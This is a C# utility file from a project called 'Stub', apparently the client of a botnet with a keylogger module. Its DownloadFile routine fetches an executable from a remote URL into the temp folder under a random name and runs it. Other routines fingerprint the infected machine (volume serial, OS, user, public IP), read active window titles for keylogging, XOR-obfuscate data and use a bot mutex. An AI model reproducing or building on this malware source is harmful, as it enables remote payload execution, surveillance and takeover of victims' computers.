using System;
using System.Text;
using System.IO;
using System.Net;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Cryptography;
using System.IO.Compression;
using System.Collections.Generic;
using System.Text.RegularExpressions;
using System.Reflection.Emit;
using Stub.Core.Modules.Keylogger;
using Stub.WinAPI;
using System.Threading;
using Stub.Core;

namespace Stub.Utilities
{
    class CUtils
    {
        [DllImport("kernel32.dll")]
        private static extern long GetVolumeInformation(string PathName, StringBuilder VolumeNameBuffer, UInt32 VolumeNameSize, ref UInt32 VolumeSerialNumber, ref UInt32 MaximumComponentLength, ref UInt32 FileSystemFlags, StringBuilder FileSystemNameBuffer, UInt32 FileSystemNameSize);

        private static Random _rRandom = new Random();

        public static int RandomInt(Int32 iMin, Int32 iMax)
        {
            return _rRandom.Next(iMin, iMax);
        }

        public static String RandomString(Int32 iLength)
        {
            char[] arr_cChars = "abcdefghijklmnopqrstuvzxywABCDEFGHIJKLMNOPQRSTUVZXYW".ToCharArray();

            String strOut = String.Empty;

            while (strOut.Length != iLength)
                strOut += arr_cChars[RandomInt(0, arr_cChars.Length)];

            return strOut;
        }

        public static Byte[] RandomBytes(Int32 iLength)
        {
            try
            {
                Byte[] arr_bBuffer = new Byte[iLength];

                _rRandom.NextBytes(arr_bBuffer);

                return arr_bBuffer;
            }
            catch { }
            return null;
        }

        public static String GetAppData()
        {
            try
            {
                String strAppData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

                if (!strAppData.EndsWith(@"\")) strAppData += @"\";

                return strAppData;
            }
            catch { }
            return String.Empty;
        }

        public static String GetTempPath()
        {
            try
            {
                String strTemp = Path.GetTempPath();

                if (!strTemp.EndsWith(@"\")) strTemp += @"\";

                return strTemp;
            }
            catch { }

            return String.Empty;
        }

        public static String GetMainPath()
        {
            try
            {
                return Assembly.GetExecutingAssembly().Location;
            }
            catch { }
            return String.Empty;
        }

        public static String GetSystemDir()
        {
            try
            {
                String strSystemDir = Environment.GetEnvironmentVariable("windir");

                if (!strSystemDir.EndsWith(@"\")) strSystemDir += @"\";

                return strSystemDir;
            }
            catch { }
            return String.Empty;
        }

        public static Boolean DownloadFile(String strURL)
        {
            if (!strURL.StartsWith(@"http://") || !strURL.EndsWith(".exe")) return false;

            try
            {
                using (WebClient webClient = new WebClient())
                {
                    try
                    {
                        String strTemp = GetTempPath();

                        if (String.IsNullOrEmpty(strTemp)) return false;

                        String strRandFileName = RandomString(15);

                        if (String.IsNullOrEmpty(strRandFileName)) return false;

                        strTemp += String.Format("{0}.exe", strRandFileName);

                        webClient.Headers.Add("User-Agent", "Test");

                        webClient.DownloadFile(strURL, strTemp);

                        Process.Start(strTemp);
                        return true;
                    }
                    catch { }
                }
            }
            catch { }
            return false;
        }

        public static String GetVolumeSerial()
        {
            try
            {
                uint serNum = 0;
                uint maxCompLen = 0;
                StringBuilder VolLabel = new StringBuilder(256); // Label
                UInt32 VolFlags = new UInt32();
                StringBuilder FSName = new StringBuilder(256); // File System Name
                String strDriveLetter = Path.GetPathRoot(Environment.SystemDirectory);
                long Ret = GetVolumeInformation(strDriveLetter, VolLabel, (UInt32)VolLabel.Capacity, ref serNum, ref maxCompLen, ref VolFlags, FSName, (UInt32)FSName.Capacity);
                return Convert.ToString(serNum);
            }
            catch { }
            return String.Empty;
        }

        public static String GetSHA1(String strData)
        {
            try
            {
                SHA1 sha = new SHA1CryptoServiceProvider();

                byte[] arr_bBuffer = sha.ComputeHash(UTF8Encoding.Default.GetBytes(strData));

                String strOut = String.Empty;

                for (int i = 0; i < arr_bBuffer.Length; i++)
                {
                    strOut += arr_bBuffer[i].ToString("x2");
                }

                return strOut.Substring(1, 12);
            }
            catch { }
            return String.Empty;
        }

        public static String GetOS()
        {
            return string.Format("{0} {1} {2} {3}-bit", COSInfo.Name, COSInfo.Edition, COSInfo.ServicePack, COSInfo.Bits);
        }

        public static String GetUsername()
        {
            return String.Format("{0}@{1}", Environment.UserName, Environment.MachineName);
        }

        public static byte[] Compress(byte[] arr_bData)
        {
            using (MemoryStream msInput = new MemoryStream(arr_bData))
            {
                using (MemoryStream msOutput = new MemoryStream())
                {
                    using (GZipStream zsStream = new GZipStream(msOutput, CompressionMode.Compress))
                    {
                        msInput.WriteTo(zsStream);
                    }
                    return msOutput.ToArray();
                }
            }
        }

        public static byte[] Decompress(byte[] arr_bData)
        {
            using (MemoryStream msInput = new MemoryStream(arr_bData))
            {
                using (MemoryStream msOutput = new MemoryStream())
                {
                    using (GZipStream zsStream = new GZipStream(msInput, CompressionMode.Decompress))
                    {
                        int iRead = 0;
                        byte[] arr_bBuffer = new byte[8192];
                        do
                        {
                            iRead = zsStream.Read(arr_bBuffer, 0, arr_bBuffer.Length);

                            if (iRead > 0) msOutput.Write(arr_bBuffer, 0, iRead);
                        } while (iRead > 0);
                        return msOutput.ToArray();
                    }
                }
            }
        }

        public static byte[] XorCrypt(byte[] arr_bData, string strKey)
        {
            byte[] arr_bKey = UTF8Encoding.Default.GetBytes(strKey);

            for (int i = 0; i < arr_bData.Length; i++)
            {
                foreach (byte bKey in arr_bKey)
                    arr_bData[i] ^= bKey;
            }
            return arr_bData;
        }

        public static IPAddress ResolveHost(String strHost)
        {
            try
            {
                return Dns.GetHostAddresses(strHost)[0];
            }
            catch { }
            return null;
        }

        public static List<Byte[]> SplitBytes(Byte[] arr_bInput, Int32 iSize)
        {
            List<Byte[]> lstChunks = new List<Byte[]>();

            List<Byte> lstChunk = new List<Byte>();

            int iCurrentIndex = 0;
            for (int i = 0; i < arr_bInput.Length; i++)
            {
                iCurrentIndex++;
                lstChunk.Add(arr_bInput[i]);
                if (iCurrentIndex == iSize ||
                    i == arr_bInput.Length - 1)
                {
                    lstChunks.Add(lstChunk.ToArray());
                    lstChunk.Clear();
                    iCurrentIndex = 0;
                }
            }
            return lstChunks;
        }

        public static String GetIPv4()
        {
            try
            {
                using (WebClient webClient = new WebClient())
                {
                    webClient.Headers.Add("User-Agent", "Google");
                    return new Regex(@"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}").Matches(webClient.DownloadString("http://checkip.dyndns.org/"))[0].ToString();
                }
            }
            catch
            {

            }
            return string.Empty;
        }

        public static string GetActiveWindowText()
        {
            string strWindow = string.Empty;

            try
            {
                IntPtr pHandle = CUser32.GetForegroundWindow();

                if (pHandle == null)
                    return strWindow;

                StringBuilder sbActiveWindow = new StringBuilder(256);

                if (CUser32.GetWindowText(pHandle, sbActiveWindow, 256) > 0)
                    strWindow = sbActiveWindow.ToString();
            }
            catch { }

            return strWindow;
        }

        public static bool IsElevated()
        {
            try
            {
                Process.EnterDebugMode();
                Process.LeaveDebugMode();
                
                return true;
            }
            catch { }

            return false;
        }

        public static int GetCPUUsage()
        {
            PerformanceCounter cpuCounter = new PerformanceCounter("Processor", "% Processor Time", "_Total");
            cpuCounter.NextValue();
            Thread.Sleep(1000); // wait a second to get a valid reading
            return (int)cpuCounter.NextValue();
        }

        public static bool IsSingleInstance(out Mutex mInstance)
        {
            mInstance = null;

            try
            {
                mInstance = Mutex.OpenExisting(CBot.BotConfig.BotMutex);
            }
            catch
            {
                try
                {
                    mInstance = new Mutex(true, CBot.BotConfig.BotMutex);
                    return true;
                }
                catch { }
            }

            return false;
        }
    }
}
